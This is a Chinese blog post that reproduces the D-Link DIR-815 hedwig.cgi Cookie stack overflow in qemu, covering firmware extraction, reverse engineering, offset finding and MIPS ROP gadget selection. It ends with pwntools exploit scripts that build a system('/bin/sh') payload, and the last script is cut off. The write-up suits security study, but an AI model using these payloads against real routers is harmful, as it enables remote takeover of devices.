<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/d1f081a9.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/d1f081a9.html" class="post-title-link" itemprop="url">D-Link DIR-815路由器溢出漏洞分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-23 13:07:26" itemprop="dateCreated datePublished" datetime="2023-05-23T13:07:26+08:00">2023-05-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-06-07 09:35:19" itemprop="dateModified" datetime="2023-06-07T09:35:19+08:00">2023-06-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>网上关于 <code>D-Link DIR-815</code> 路由器漏洞复现的文章还是蛮多的，因此第一次的复现选择了这个软柿子🤔。因为相关文章很多的缘故，所以我尽可能来写一些大多文章没有提到的点。</p>
<blockquote>
<p><strong>漏洞描述 ：DIR-815 固件中的 Hedwig.cgi 脚本中，在处理 HTTP 头时，如果 Cookie 字段中含 uid&#x3D; 的值则存在栈溢出漏洞，从而获得路由器远程控制权限</strong></p>
<p><strong>影响版本 ：DIR-815&#x2F;300&#x2F;600&#x2F;645等</strong></p>
</blockquote>
<p>首先下载固件，然后用 <code>binwalk</code> 解压出来得到文件系统，很多文章对这里进行了详细介绍，这里就不再赘述了，只记录一个关于解压后出现的软链接问题。我的 <code>ubuntu 18.04</code> 中 <code>binwalk</code>  解压文件系统时报了如下的 <code>warning</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241301795.png" alt="image-20230524130155598"></p>
<p>查看 <code>web</code> 目录下的文件发现软链接都指向了 <code>/dev/null </code>（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241304963.png" alt="image-20230524130428836" style="zoom:50%;" />

<p>如果单纯的为了启动程序，可以去手动设置回原本的软链接（上面的 <code>warning</code> 中有记录原本的链接位置在哪），下文中也提到了这一点。不过在该漏洞复现完之后，我在一篇文章中发现了解决的方法。</p>
<p>先去下面这个目录，然后找到 <code>extractor.py</code> 文件（如果找不到这个目录的话也可以用 <code>find</code> 搜一下 <code>extractor.py</code> 的位置）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241311237.png" alt="image-20230524131107143"></p>
<p>然后来编辑这个文件，直接翻到文件的最后一行，应该是下面这样的</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241315177.png" alt="image-20230524131525489" style="zoom:67%;" />

<p>就改成 <code>if 0 and not</code> 让这个 <code>if</code> 进不去即可。</p>
<p>最后执行命令 <code>sudo python3 setup.py install</code> 重新安装 <code>binwalk</code> 就能生效了，可以看到现在的效果是正常的（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241319641.png" alt="image-20230524131948361"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241320382.png" alt="image-20230524132004859" style="zoom:50%;" />

<p>不过需要提一句，这里即使看起来软链接是正常的，但依然无法正常启动程序，如果想要运行某个程序的话（依然需要自己手动创建一个软链接，至少我的是这样）</p>
<h3 id="运行时报错"><a href="#运行时报错" class="headerlink" title="运行时报错"></a>运行时报错</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181721376.png" alt="image-20230518172151330"></p>
<p>这个报错说明找不到 <code>libgcc_s.so.1</code> 文件，解决方法是将解压固件得到的文件系统中的 <code>/lib</code> 目录下的 <code>libgcc_s.so.1</code> 文件软链接到 <code>/lib</code> 目录下即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305190951158.png" alt="image-20230519095103004"></p>
<p>然后再次运行发现并不是原本缺少 <code>libgcc_s.so.1</code> 的报错了（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181658971.png" alt="image-20230518165839841"></p>
<p>看到这个字符串会感觉有点熟悉，将 <code>cgibin</code> 拖到 <code>ida</code> 里发现是程序里没有匹配到相应的函数（如下），因为运行的 <code>cgibin</code> 程序并不在这个匹配的列表中，正常情况下都是通过软链接指向的这个程序来执行的。所以要去执行 <code>hedwig.cgi</code> 程序</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181659144.png" alt="image-20230518165917093"></p>
<p>因为当初 <code>binwalk</code> 提取完固件，其中 <code>hedwig.cgi</code> 的软链接都指向了 <code>/dev/null</code> ，所以这里要把 <code>hedwig.cgi</code> 删掉，重新生成一个 <code>cgibin</code> 的软链接。</p>
<p>下图程序是成功跑起来了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181713829.png" alt="image-20230518171306696"></p>
<h3 id="分析二进制文件"><a href="#分析二进制文件" class="headerlink" title="分析二进制文件"></a>分析二进制文件</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p><code>main</code> 函数的最开始在匹配程序名以来调用不同的函数来实现具体功能。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305180744182.png" alt="image-20230518074412983" style="zoom:50%;" />

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = *argv;</span><br><span class="line">v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  v3 = v6 + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="type">void</span> (__noreturn *)())phpcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以这段代码为例，首先根据 <code>*argv</code> 获取程序的名字，通过 <code>strrchr</code> 函数来匹配程序名中最后一个 <code>/</code> 出现的位置， <code>v6+1</code> 取的是 <code>/</code> 的下一个字符的地址，然后来匹配是否为 <code>phpcgi</code> 这个字符串， 如果是的话则跳转到 <code>phpcgi_main</code> 函数，整个 <code>main</code> 函数都是在做这个事情</p>
<h4 id="hedwigcgi-main"><a href="#hedwigcgi-main" class="headerlink" title="hedwigcgi_main"></a>hedwigcgi_main</h4><p>接下来逐步分析 <code>hedwigcgi_main</code> 函数</p>
<p><code>sprintf</code> 是危险函数，将字符串格式化后拷贝到指定内存时没有规定长度大小从而可能存在溢出</p>
<p>这里需要让环境变量 <code>REQUEST_METHOD</code> 为 <code>POST</code> ，并且创建 <code>/var/tmp/temp.xml</code> 文件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210851749.png" alt="image-20230521085117376"></p>
<p>上图中出现的一个关键函数是 <code>sess_get_uid</code> ，它的作用是将提取的 <code>COOKIE</code> 中 <code>uid=</code> 后面的字符串存为 <code>v4</code> 的 <code>data</code> 字段。下面来分析一下这个函数</p>
<h5 id="sess-get-uid"><a href="#sess-get-uid" class="headerlink" title="sess_get_uid"></a>sess_get_uid</h5><p>在分析这个函数之前，还需要分析前面出现过的几个函数 <code>sobj_new</code> <code>sobj_strcmp</code> <code>sobj_add_char</code>  <code>sobj_get_string</code> </p>
<h5 id="sobj-new"><a href="#sobj-new" class="headerlink" title="sobj_new"></a>sobj_new</h5><p>申请了一块堆，用来存储结构体的数据，主要关注的是 <code>max_len</code>  <code>used_len</code> <code>data</code> 这三个成员，其他几个之后逆向分析的时候没用到（这里每个字段的含义，不是一上来就知道的，这是分析其他函数时进行猜测的）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181102504.png" alt="image-20230518110253441" style="zoom:50%;" />

<h5 id="sobj-strcmp"><a href="#sobj-strcmp" class="headerlink" title="sobj_strcmp"></a>sobj_strcmp</h5><p>传入的参数一个是 <code>sobj_new</code> 返回的结构体指针，另一个是字符串指针，判断结构体的 <code>data</code> 字段存储的字符串是否和传入的字符串一样</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181117507.png" alt="image-20230518111747463" style="zoom:50%;" />

<h5 id="sobj-add-char"><a href="#sobj-add-char" class="headerlink" title="sobj_add_char"></a>sobj_add_char</h5><p>传入了 <code>sobj_new</code> 返回的结构体指针，另一个参数是字符。首先判断结构体指针是否存在，<code>max_len</code> 是否等于 <code>used_len</code> 。如果符合条件的话将字符 <code>ch</code> 写入到 <code>data</code> 字段中，并且让 <code>used_len</code> 字段加一。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181126711.png" alt="image-20230518112641661" style="zoom:50%;" />



<h5 id="sobj-get-string"><a href="#sobj-get-string" class="headerlink" title="sobj_get_string"></a>sobj_get_string</h5><p>该函数用于返回传入的结构体指针中 <code>data</code> 域的指针</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181132195.png" alt="image-20230518113206147" style="zoom:50%;" />



<p>现在来分析 <code>sess_get_uid</code> </p>
<p>函数最开始进行了一些初始化和判断，同时拿到了环境变量 <code>HTTP_COOKIE</code> 值的指针，并设置   <code>state</code> （ 状态位）为 <code>0</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181110826.png" alt="image-20230518111058786" style="zoom:50%;" />

<p>该函数具体功能是通过逐个扫描 <code>COOKIE</code> 的字符，来寻找 <code>=</code> ，如果找到了 <code>=</code> 则设置 <code>state</code> 为 <code>2</code> ，之后再扫描字符的时候因为 <code>state</code> 为 <code>2</code> 的缘故，都会进入另一个分支，去将扫描 <code>COOKIE</code> 的字符存储到 <code>v4</code> 结构体的 <code>data</code> 成员中。如果没有找到 <code>=</code> 那么 <code>state</code> 一直为 <code>1</code> ，则始终将 <code>COOKIE</code> 的字符存储到 <code>v2</code> 结构体的 <code>data</code> 成员中（如下图）</p>
<p>当扫描完 <code>COOKIE</code> 的所有字符后，去判断 <code>v2</code> 结构体的 <code>data</code> 成员是否为字符串 <code>uid</code> ，如果是的话，就将 <code>v4</code> 结构体之前存储的字符串写到结构体 <code>a1</code> 的 <code>data</code> 域中。（ <code>a1</code> 也就是 <code>sess_get_uid</code> 函数传入的结构体指针）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210943265.png" alt="image-20230521094300133" style="zoom: 67%;" />



<p>再回到 <code>hedwigcgi_main</code> 函数上，现在想执行到真正利用的溢出点，需要控制 <code>haystack</code> 的值才行（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210954878.png" alt="image-20230521095402701" style="zoom:50%;" /> 



<h4 id="控制-haystack"><a href="#控制-haystack" class="headerlink" title="控制 haystack"></a>控制 <code>haystack</code></h4><p>通过查看 <code>haystack</code> 的交叉引用（如下图），发现只有一个地方可以对 <code>haystack</code> 进行赋值</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210959344.png" alt="image-20230521095927264" style="zoom:67%;" />



<p>跳转过去到了 <code>409A6C</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211000998.png" alt="image-20230521100001952" style="zoom:50%;" />

<p>如果记性不错的话应该能想起来它是一个回调函数，在 <code>hedwigcgi_main</code> 函数中出现过 <code>cgibin_parse_request((int)sub_409A6C, 0, 0x20000u);</code> 因此就要去分析 <code>cgibin_parse_request</code> 函数，看看是何时调用了 <code>409A6C</code> 函数</p>
<h5 id="cgibin-parse-request"><a href="#cgibin-parse-request" class="headerlink" title="cgibin_parse_request"></a>cgibin_parse_request</h5><p>这里是 <code>cgibin_parse_request</code> 函数的后部分，前部分要满足 <code>CONTENT_LENGTH &lt; 0x20000</code> 和 <code>REQUEST_URI</code> 这个值要存在，这样才能走到下面这部分</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211014282.png" alt="image-20230521101434200" style="zoom: 67%;" />

<p>这里设置 <code>CONTENT_TYPE</code> 为 <code>aApplication</code> ，最后会调用 <code>0x42C014[2]</code> 位置的指针，该函数指针就是 <code>0x403B10</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211050021.png" alt="image-20230521105041949"></p>
<p>之后给个分析的思路吧， 实在不想写这么详细了。</p>
<p>进入 <code>403B10</code> 函数，首先 <code>CONTENT_TYPE</code> 在原本的 <code>aApplication</code> 后面要再加上字符串 <code>x-www-form-urlencoded</code> 才能进入主逻辑部分。 <code>read</code> 会读入 <code>0xc</code> 个数据，然后将这个输入的数据作为参数调用 <code>402B40</code> 函数，这个函数将刚刚读入的数据，以 <code>=</code> 进行分割。接着调用了函数指针 <code>v9</code> （这个 <code>v9</code> 就是最开始所说的回调函数 <code>409A6C</code> ），而刚刚 <code>=</code> 前面的数据会被当做参数传进来，下面再看一下 <code>409A6c</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211102535.png" alt="image-20230521110226484"></p>
<p>因此只要走到这里，<code>haystack</code> 就会被赋值成 <code>=</code> 前面字符串的地址。从而绕过 <code>if ( !haystack )</code> 这个判断。</p>
<p>总结一下赋值 <code>haystack</code> 的函数调用链 ：<code>cgibin_parse_requeset -&gt; 403b10 -&gt; 402b40 -&gt; 函数指针v9</code> ，初学者可以自行去详细分析上述过程。</p>
<h3 id="qemu-用户模式下复现"><a href="#qemu-用户模式下复现" class="headerlink" title="qemu 用户模式下复现"></a><code>qemu</code> 用户模式下复现</h3><h4 id="ROP-链的布置"><a href="#ROP-链的布置" class="headerlink" title="ROP 链的布置"></a><code>ROP</code> 链的布置</h4><p>现在是肯定能走到第二次的 <code>sprintf</code> 进行溢出了。现在我们来测一下溢出控制返回地址的偏移量是多少。</p>
<h5 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h5><p>先准备一个 <code>payload</code> 文件，里面放入 <code>COOKIE</code> 的值，这里直接用 <code>cyclic 2000 &gt; payload</code> ，不过别忘记在最开始加一个 <code>uid=</code> 字符串</p>
<p>然后写一个启动脚本（如下），这里简单说明一下这个脚本。首先使用 <code>chroot</code> 命令将当前目录 <code>squashfs-root</code> 设置为根目录，因为程序打开的文件都是相对于这个文件系统来说的。一旦将 <code>squashfs-root</code> 设置为根目录，那么 <code>qemu-mipsel</code>  就没办法使用了，因为依赖了其他目录的库文件，因此我们使用静态链接的 <code>qemu-mipsel-static</code> （我的 <code>ubuntu 18.04</code> 上用 <code>apt-get install</code> 安装的 <code>qemu-mipsel-static</code> 会报一个错误</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211510370.png" alt="image-20230521151058316"></p>
<p>原因是这个 <code>qemu-mipsel-static</code> 版本太低，我的解决方法是在 <code>ubuntu 22.04</code> 上安装后，拖到了 <code>18.04</code> 上）  </p>
<p><code>-E</code> 用于指定要在模拟的虚拟机中设置的环境变量，而这些变量是前面分析过的，进行设置即可,剩下的就和调试 <code>MIPS</code> 架构的程序一样了，有需要的话可以查看这篇 <a href="https://zikh26.github.io/posts/919c29c4.html#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F">文章</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">payload=$(echo &quot;$(cat payload)&quot;)</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=666 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$payload -E REQUEST_URL=&quot;zikh26&quot;  -g 1234 /htdocs/web/hedwig.cgi </span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211147020.png" alt="image-20230521114724909"></p>
<p>发现覆盖到返回地址需要填充 <code>1043</code> 的垃圾数据。</p>
<p>通过观察函数最后返回处的汇编，这里是可以控制很多寄存器，我们接下来就是要通过这些可控的寄存器来完成 <code>ROP</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211148333.png" alt="image-20230521114847280"></p>
<h5 id="ROP-system"><a href="#ROP-system" class="headerlink" title="ROP-system"></a>ROP-system</h5><p>因为这个程序的溢出是 <code>sprintf</code> 导致的， <code>\x00</code> 可以造成字符串的截断，而 <code>system</code> 函数地址末尾就是 <code>\x00</code> ，为了避免被截断，我们要先让 <code>system</code> 函数的地址减一放入一个寄存器，之后跳转到能让这个寄存器加一的 <code>gadget</code> 上。<code>MIPS</code> 架构的 <code>ROP</code> 是通过寄存器间的跳转实现的，而 <code>x86</code> 中通常是用 <code>ret</code> 指令根据栈中存放的数据来跳转的。</p>
<p>在 《揭秘家用路由器0day漏洞挖掘技术》一书中对该 <code>ROP</code>  链布局画的十分形象（如下），因为上面提到了我们能控制很多寄存器，就先在 <code>$ra</code> 寄存器布置一个让 <code>$s0</code> 加一的 <code>gadget</code> （提前控制 <code>$s0</code> 为 <code>system</code> 减一的地址），接着跳转到一段能赋值栈地址的 <code>gadget</code> 上（用于指向 <code>/bin/sh</code> ），最后跳回到 <code>system</code> 上</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211441230.png" alt="image-20230521144117106"></p>
<p>补充：</p>
<ol>
<li>程序依赖的 <code>libc</code> 是软链接 <code>libc.so.0</code> 指向的 <code>libuClibc-0.9.30.1.so</code> ，因此 <code>gadget</code> 要去这个里面找</li>
<li>找 <code>gadget</code> 的话，用 <code>IDA</code> 插件 <code>mipsrop</code> 。以上面两段 <code>gadget</code> 为例，搜寄存器加一的指令可以这么搜 <code>mipsrop.find(&quot;addiu .*,1&quot;)</code> ，当然了可能会出现下面的报错</li>
</ol>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211457716.png" alt="image-20230521145755628"></p>
<p>只需要点一下 <code>search -&gt; mips rop gadgets</code>  即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211458582.png" alt="image-20230521145839462"></p>
<p>能匹配到很多个 <code>gadget</code> （如下），根据自己布局的需求来选择合适的就可以</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211500301.png" alt="image-20230521150004230"></p>
<p>如果要搜将栈地址放入某个寄存器的 <code>gadget</code> ，可以用 <code>mipsrop.stackfinder()</code> 命令（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211502965.png" alt="image-20230521150247898"></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">winmt</a> 师傅提到 用户模式不支持多线程，而 <code>system</code> 函数会调用 <code>fork</code> 函数，从而导致 <code>fork</code> 执行失败，<code>system</code> 执行到这里后就会卡住。不过之后在系统模式下是没问题的</p>
<h6 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x159cc</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin//sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211521976.png" alt="image-20230521152152411" style="zoom:50%;" />

<p>上面的 <code>exp</code> 是可以正常走到 <code>system</code> 函数的，但是 <code>a0</code> 是 <code>/bin//sh/postxml</code> ，这是因为第一次 <code>sprintf</code> 拼接了后面的字符串常量 <code>postxml</code> 。因为地址固定的原因，我们可以直接使用 <code>libc</code> 中的 <code>/bin/sh</code> 地址 EXP如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(bin_sh_addr)<span class="comment">#$s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span 